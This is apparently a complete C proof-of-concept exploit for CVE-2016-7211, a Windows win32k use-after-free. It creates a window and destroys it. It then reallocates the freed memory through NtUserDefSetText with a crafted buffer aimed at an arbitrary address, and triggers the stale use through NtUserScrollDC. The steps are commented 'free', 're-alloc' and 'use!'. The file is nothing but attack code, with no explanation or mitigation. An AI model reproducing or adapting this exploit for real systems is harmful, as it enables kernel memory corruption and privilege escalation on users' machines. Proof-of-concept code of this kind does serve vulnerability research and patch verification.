/*
********************************************************************
 Created:	2016-07-08 14:17:28
 Filename: 	poc.c
 Author:	root@tinysec.net
*********************************************************************
*/
#pragma warning(disable:4152)
#pragma warning(disable:4127)
	
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


#pragma comment(lib,"ntdll.lib")


typedef struct _LARGE_UNICODE_STRING {
    ULONG Length;
    ULONG MaximumLength : 31;
    ULONG bAnsi : 1;
    PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;



BOOL __stdcall NtGdiMakeObjectXferable(__in HGDIOBJ hObject , __in ULONG nProcessId);

BOOL __stdcall NtUserLockWindowUpdate(__in HWND hWnd);

BOOL __stdcall NtUserScrollDC(__in HDC hDC , __in int nX , __in int nY , __in RECT* lprcScroll , __in RECT* lprcClip , __in HRGN hRgnUpdate , __in RECT* lprcUpdate);

BOOL __stdcall NtUserDefSetText(__in HWND hWnd , __in PVOID plsWindowText);


#define SET_ULONG(p,offset,value)		(*( (ULONG*)( ((UCHAR*)(p)) + (offset) ) ) = ((ULONG)(value)) )

VOID RtlInitLargeUnicodeString(
							   PLARGE_UNICODE_STRING plstr,
							   LPCWSTR psz,
							   UINT cchLimit)
{
    plstr->Buffer = (PWSTR)psz;
    plstr->bAnsi = FALSE;

    plstr->Length = cchLimit;
    plstr->MaximumLength = cchLimit;
}


int __cdecl wmain(int nArgc, WCHAR** Argv)
{
	HWND			hWnd = NULL;
	HDC				hDC = NULL;

	WNDCLASSEXW		wc = {0};
	RECT			rc1 = {0};
	
	LARGE_UNICODE_STRING	lusEvil = {0};
	WCHAR					szUserBuffer[ 0x870 ] = {0};

	ULONG					nWantedAddress = 0xdeadbeef;
	
	
		// for win10 
		wc.cbSize = sizeof(wc);
		wc.cbClsExtra = 0;
		wc.cbWndExtra = 0x1000;
		wc.hbrBackground = NULL;
		wc.hCursor = NULL;
		wc.hIcon = NULL;
		wc.hIconSm = NULL;
		wc.hInstance = GetModuleHandleW(NULL);
		wc.lpfnWndProc = DefWindowProcW;
		wc.lpszClassName = L"CVE-2016-7211";
		wc.lpszMenuName = NULL;
		wc.style = CS_CLASSDC;
		
		RegisterClassExW(&wc);
		
		hWnd = CreateWindowW(
			L"CVE-2016-7211" ,
			L"CVE-2016-7211",
			WS_OVERLAPPEDWINDOW|WS_VISIBLE,
			0,
			0,
			400,
			400,
			NULL,
			NULL,
			GetModuleHandleW(NULL) ,
			NULL
		);
		
		hDC = GetWindowDC( hWnd );

		memset(szUserBuffer , 0xFF , sizeof(szUserBuffer) - sizeof(WCHAR) );
		
		SET_ULONG( szUserBuffer , 0x020 , 0xFFFFFFFF );
		
		SET_ULONG( szUserBuffer , 0x02a , 0x29D );
		
		#ifdef _WIN64
			SET_ULONG( szUserBuffer , 0x034 , nWantedAddress - 0x034 );
		#else
			SET_ULONG( szUserBuffer , 0x034 , nWantedAddress - 0x034 );
		#endif
		
		RtlInitLargeUnicodeString(&lusEvil , szUserBuffer , sizeof(szUserBuffer) - sizeof(WCHAR) );
		
		NtGdiMakeObjectXferable( hDC , 0 );
	
		// free
		DestroyWindow(hWnd);

		// re-alloc
		NtUserDefSetText( GetDesktopWindow() , &lusEvil );
		
		NtUserLockWindowUpdate(  GetDesktopWindow()  );
		
		rc1.left = 354;
		rc1.top = 12;
		rc1.right = 459;
		rc1.bottom = 831;

		// use!
		NtUserScrollDC( hDC , 10 , 20 ,  &rc1 , &rc1 , NULL ,  &rc1 );
	
	return 0;
}



